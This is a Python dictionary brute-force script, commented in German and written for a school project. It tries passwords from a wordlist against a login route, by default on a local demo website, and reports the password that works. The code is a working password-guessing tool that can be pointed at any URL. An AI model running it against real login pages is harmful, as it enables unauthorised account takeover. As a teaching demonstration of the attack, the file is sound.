"""Brute-Force-Tool fuer den Passwort-Nussknacker.

Demonstriert einen Wörterbuch-Angriff gegen die eigene Demo-Login-Website.
Das Tool kommuniziert ausschliesslich über die HTTP-Schnittstelle (/login)
und verhält sich wie ein externer Angreifer - es kennt die Datenbank nicht.

Ausschliesslich für die lokale Test-Website gedacht (Schulprojekt Modul 306).

Aufruf:
    python bruteforce.py --email opfer@test.ch
"""

import argparse
import time

import requests


def load_wordlist(path: str) -> list[str]:
    """Liest die Passwortliste zeilenweise ein und entfernt Leerzeilen."""
    with open(path, encoding="utf-8") as f:
        return [line.strip() for line in f if line.strip()]


def try_login(url: str, email: str, password: str) -> bool:
    """Sendet einen Loginversuch. Gibt True zurück, wenn der Login klappt.

    Die Website antwortet mit Statuscode 200 bei Erfolg und 401 bei Fehler.
    """
    response = requests.post(url, data={"email": email, "password": password})
    return response.status_code == 200


def brute_force(url: str, email: str, wordlist: list[str], delay: float) -> str | None:
    """Probiert jedes Passwort aus der Liste der Reihe nach durch."""
    start = time.time()

    for attempt, password in enumerate(wordlist, start=1):
        print(f"[{attempt}/{len(wordlist)}] Versuche: {password}")

        if try_login(url, email, password):
            dauer = time.time() - start
            print("\n" + "=" * 40)
            print(f"PASSWORT GEFUNDEN: {password}")
            print(f"Versuche benötigt: {attempt}")
            print(f"Dauer: {dauer:.2f} Sekunden")
            print("=" * 40)
            return password

        if delay > 0:
            time.sleep(delay)

    print("\nKein Passwort aus der Liste hat funktioniert.")
    return None


def main():
    parser = argparse.ArgumentParser(description="Brute-Force-Demo gegen die lokale Login-Website")
    parser.add_argument("--url", default="http://127.0.0.1:5000/login",
                        help="Adresse der Login-Route (Standard: lokale Demo)")
    parser.add_argument("--email", required=True,
                        help="E-Mail des Zielkontos")
    parser.add_argument("--wordlist", default="wordlists/common.txt",
                        help="Pfad zur Passwortliste")
    parser.add_argument("--delay", type=float, default=0.0,
                        help="Pause zwischen den Versuchen in Sekunden")
    args = parser.parse_args()

    wordlist = load_wordlist(args.wordlist)
    print(f"Ziel: {args.url}")
    print(f"Konto: {args.email}")
    print(f"Passwörter in der Liste: {len(wordlist)}\n")

    brute_force(args.url, args.email, wordlist, args.delay)


if __name__ == "__main__":
    main()
